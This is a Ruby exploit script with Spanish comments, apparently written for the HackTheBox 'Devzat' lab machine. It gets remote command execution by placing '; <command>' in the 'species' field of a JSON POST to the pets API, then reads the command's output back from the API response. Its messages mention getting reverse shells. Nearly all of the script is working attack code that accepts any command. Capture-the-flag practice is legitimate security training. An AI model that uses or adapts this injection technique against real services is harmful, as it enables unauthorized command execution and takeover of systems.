# Some References:
# -- https://github.com/httprb/http/wiki
# -- https://stackoverflow.com/questions/1489183/how-can-i-use-ruby-to-colorize-the-text-output-to-a-terminal

require 'http'
require 'json'
require 'base64'

# -- Variables Globales -----------------------------------------------
$url_site = "http://pets.devzat.htb"
$args = ARGV

# -- Clases -----------------------------------------------------------
class String # pa darle colores a la vida 
  def black;          "\e[30m#{self}\e[0m" end
  def red;            "\e[31m#{self}\e[0m" end
  def green;          "\e[32m#{self}\e[0m" end
  def brown;          "\e[33m#{self}\e[0m" end
  def blue;           "\e[34m#{self}\e[0m" end
  def magenta;        "\e[35m#{self}\e[0m" end
  def cyan;           "\e[36m#{self}\e[0m" end
  def gray;           "\e[37m#{self}\e[0m" end
  def bold;           "\e[1m#{self}\e[22m" end
  def italic;         "\e[3m#{self}\e[23m" end
  def underline;      "\e[4m#{self}\e[24m" end
  def blink;          "\e[5m#{self}\e[25m" end
  def reverse_color;  "\e[7m#{self}\e[27m" end
end

# -- Funciones del programa -------------------------------------------
def main()
  puts Base64.decode64("CuKVpeKUgOKUgOKVluKVk+KUgOKUgCDilaUgIOKVpeKUgOKUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgOKVlgrilZEgIOKVkeKVkSAgIOKVkSAg4pWiICAg4pWr4pWRICDilavilZkg4pWR4pWcCiAgIOKVq+KVq+KUgOKUgCDilZnilZbilZPilZzilZPilIDilIDilZzilZHilIDilIDilaIgIOKVkSAK4pSA4pSA4pSA4pWc4pWZ4pSA4pSA4pSAIOKVmeKVnCDilZnilIDilIDilIDilaggIOKVqCDilIDilagg4oCiIGJ5IGxhbnoKCkhhY2tUaGVCb3ggLSBEZXZ6YXQgfCBFamVjdWNpw7NuIHJlbW90YSBkZSBjb21hbmRvcyBtZWRpYW50ZSB1biBDb21tYW5kLUluamVjdGlvbi4K")
  puts "\n[+] Ejecutando: #{$args[0].blue}"

  payload = "; #{$args[0]}"

  for done in 1..5 do
    begin
      # Creamos "mascota" explosiva
      r = HTTP.timeout(3).post($url_site + '/api/pet', :json => {
        :name => "hola", 
        :species => payload
      })

      # Ejecutamos la explosión
      r = HTTP.timeout(3).get($url_site + '/api/pet')
    rescue HTTP::TimeoutError => e
      puts "[" + "+".green + "] Lo más probable es que hayas ejecutado una Reverse Shell, a seguir rompiendo!"
      exit(0)
    end

    # Nos aseguramos de extraer la respuesta del comando
    if r.to_s.include? "cat: characteristics"
      break
    elsif done == 5
      puts "[" + "-".red + "] Mucho tiempo de espera, valida el comando ejecutado y su respuesta esperada!"
      puts
      exit(1)
    end
  end

  # Extraemos el numero de objetos que tiene la API y mostramos el resultado del comando
  payload_position = JSON.parse(r.to_s).length
  payload_response = JSON.parse(r.to_s)[payload_position - 1]["characteristics"]

  # Quitamos una linea molesta del output
  payload_response.slice! "cat: characteristics/: Is a directory"

  # Mostramos resultado del comando (quitando una linea en blanco)
  puts
  command_result = payload_response.gsub /^$\n/, ''
  puts command_result.brown
end

def print_help() # mostramos como ejecutar el programa
  puts "\nUso: #{File.basename($0)} <command>"
  puts "\nEjemplo:\n   #{File.basename($0)} id\n   #{File.basename($0)} 'whoami; id'\n "
  exit(1)
end

# -- Validamos argumentos y conexión con la máquina --------------------
unless ! $args[0].nil?
  print_help
end

begin
  r = HTTP.timeout(3).get($url_site)
rescue HTTP::TimeoutError => e
  puts "\n[-] Valida tu conexión contra el subdominio 'pets.devzat.htb' (puede ser VPN o /etc/hosts)."
  puts       # algo extraño, pero tocó para hacer el salto de linea final
  exit(0)
end

# Empezamos a ejecutar la locura...
main
